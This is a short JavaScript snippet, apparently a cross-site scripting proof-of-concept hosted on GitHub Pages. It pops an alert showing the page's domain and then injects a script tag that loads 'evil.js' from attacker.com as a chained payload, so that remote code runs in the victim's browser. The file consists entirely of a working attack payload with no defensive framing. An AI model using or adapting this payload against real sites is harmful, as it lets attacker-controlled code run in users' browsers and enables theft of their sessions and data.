alert("XSS ✅ Auto Executed from GitHub Pages: " + document.domain);

// You can optionally load another script dynamically too:
var s = document.createElement('script');
s.src = "https://attacker.com/evil.js"; // optional chained payload
document.body.appendChild(s);
